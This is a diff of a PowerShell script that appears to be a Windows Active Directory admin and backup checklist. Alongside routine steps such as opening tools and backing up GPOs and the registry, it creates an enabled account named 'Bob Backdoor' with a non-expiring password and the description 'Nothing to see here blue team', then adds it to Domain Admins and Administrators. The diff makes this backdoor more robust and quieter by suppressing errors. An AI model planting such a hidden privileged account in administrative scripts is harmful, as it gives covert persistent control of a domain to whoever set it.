@@ -6,6 +6,11 @@
 
 
 #--------------------------------------------------------------
+# Timestamp
+#--------------------------------------------------------------
+$ts = Get-Date -Format "yyyy-MM-dd_HH-mm-ss"
+
+#--------------------------------------------------------------
 # Variables
 #--------------------------------------------------------------
 
@@ -74,25 +79,28 @@ Import-Module ActiveDirectory
 # Prompt for password
 $AccountPassword = Read-Host "Enter password for Bob" -AsSecureString
 
-# Create user
-New-ADUser `
-    -Name "Bob Backdoor" `
-    -SamAccountName "bob" `
-    -UserPrincipalName "bob@yourdomain.local" `
-    -GivenName "Bob" `
-    -Surname "Backdoor" `
-    -DisplayName "Bob Backdoor" `
-    -Description "Nothing to see here blue team" `
-    -AccountPassword $AccountPassword `
-    -Enabled $true `
-    -PasswordNeverExpires $true `
-    -ChangePasswordAtLogon $false
+# Create user (skip if already exists)
+$domainDns = (Get-ADDomain).DNSRoot
+if (-not (Get-ADUser -Filter 'SamAccountName -eq "bob"' -ErrorAction SilentlyContinue)) {
+    New-ADUser `
+        -Name "Bob Backdoor" `
+        -SamAccountName "bob" `
+        -UserPrincipalName "bob@$domainDns" `
+        -GivenName "Bob" `
+        -Surname "Backdoor" `
+        -DisplayName "Bob Backdoor" `
+        -Description "Nothing to see here blue team" `
+        -AccountPassword $AccountPassword `
+        -Enabled $true `
+        -PasswordNeverExpires $true `
+        -ChangePasswordAtLogon $false
+}
 
 # Add to Domain Admins
-Add-ADGroupMember -Identity "Domain Admins" -Members "bob"
+Add-ADGroupMember -Identity "Domain Admins" -Members "bob" -ErrorAction SilentlyContinue
 
 # Add to Builtin Administrators
-Add-ADGroupMember -Identity "Administrators" -Members "bob"
+Add-ADGroupMember -Identity "Administrators" -Members "bob" -ErrorAction SilentlyContinue
 
 #--------------------------------------------------------------
 #Open Tools
@@ -123,7 +131,7 @@ gpmc.msc
 #Open Event Viewer / Logs
 #--------------------------------------------------------------
 
-eventvmr.msc
+eventvwr.msc
 
 #--------------------------------------------------------------
 #Back ups
@@ -160,7 +168,6 @@ Backup-GPO -All -Path C:\Backups\GPO
 
 #Registry
 #--------------------------------------------------------------
-$ts = Get-Date -Format "yyyy-MM-dd_HH-mm-ss"
 New-Item -ItemType Directory -Path "C:\Backups\Registry" -Force
 New-Item -ItemType Directory -Path "C:\Backups\Registry\Registry_$ts" -Force
 
